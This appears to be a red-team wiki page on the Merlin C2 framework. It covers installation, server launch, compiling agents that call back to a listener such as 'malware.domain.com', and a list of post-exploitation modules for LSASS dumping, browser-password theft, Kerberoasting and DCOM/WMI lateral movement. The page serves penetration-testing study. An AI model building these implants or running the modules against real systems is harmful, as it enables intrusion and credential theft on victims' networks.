---
description: 'https://github.com/Ne0nd0g/merlin'
---

# Merlin

## Installation

### Install GO

```text
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```

### Install Merlin

```text
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```

## Launch Merlin Server

```text
go run cmd/merlinserver/main.go -i
```

## Merlin Agents

You can [download precompiled agents](https://github.com/Ne0nd0g/merlin/releases)

### Compile Agents

Go to the main folder _$GOPATH/src/github.com/Ne0nd0g/merlin/_

```text
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```

### **Manual compile agents**

```text
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```

## Modules

**The bad news is that every module used by Merlin is downloaded from the source \(github\) and saved indisk before using it. Forge about usingwell known modules because Windows Defender will catch you!**  


**SafetyKatz** --&gt; Modified Mimikatz. Dump LSASS to file and launch:sekurlsa::logonpasswords to that file  
**SharpDump** --&gt; minidump for the process ID specified \(LSASS by default\) \(Itsais that the extension of the final file is .gz but indeed it is.bin, but is agz file\)  
**SharpRoast** --&gt;Kerberoast \(doesn't work\)  
**SeatBelt** --&gt; Local Security Tests in CS \(does not work\) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs  
**Compiler-CSharp** --&gt; Compile using csc.exe /unsafe  
**Sharp-Up** --&gt;Allchecks in C\# in powerup \(works\)  
**Inveigh** --&gt; PowerShellADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool \(doesn't works, need to load: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1\)  
**Invoke-InternalMonologue** --&gt; impersonates all available users and retrieves a challenge-response for each \(NTLM hash for each user\) \(bad url\)  
**Invoke-PowerThIEf** --&gt; Steal forms from IExplorer or make it execute JS or inject a DLL in that process \(doesnt work\) \(and the PS looks like doesnt work either\) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1  
**LaZagneForensic** --&gt; Get browser passwords \(works but dont prints the output directory\)  
**dumpCredStore** --&gt; Win32 Credential Manager API \(https://github.com/zetlen/clortho/blob/master/CredMan.ps1\) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details  
**Get-InjectedThread** --&gt; Detect classic injection in running processes \(Classic Injection \(OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread\)\) \(doesnt works\)  
**Get-OSTokenInformation** --&gt; Get Token Info of the running processes and threads \(User, groups, privileges, owner… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token\_information\_class\)  
**Invoke-DCOM** --&gt; Execute a command \(inother computer\) via DCOM \(http://www.enigma0x3.net.\) \(https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/\)  
**Invoke-DCOMPowerPointPivot** --&gt; Execute a command in othe PC abusing PowerPoint COM objects \(ADDin\)  
**Invoke-ExcelMacroPivot** --&gt; Execute a command in othe PC abusing DCOM in Excel  
**Find-ComputersWithRemoteAccessPolicies** --&gt; \(not working\) \(https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/\)  
**Grouper** --&gt; It dumps all the most interesting parts of group policy and then roots around in them for exploitable stuff. \(deprecated\) Take a look at Grouper2, looks really nice  
**Invoke-WMILM** --&gt; WMI to move laterally  
**Get-GPPPassword** --&gt; Look for groups.xml, scheduledtasks.xml, services.xmland datasources.xml and returns plaintext passwords \(insidedomain\)  
**Invoke-Mimikatz** --&gt; Use mimikatz \(default dump creds\)  
**PowerUp** --&gt; https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc  
**Find-BadPrivilege** --&gt; Check the privileges of users in computers  
**Find-PotentiallyCrackableAccounts** --&gt; retrieve information about user accounts associated with SPN \(Kerberoasting\)  
**psgetsystem** --&gt; getsystem

**Didn't check persistence modules**

## Resume

I really like the feeling and the potential of the tool.  
I hope the tool will start downloading the modules from the server and integrates some kind of evasion when downloading scripts.

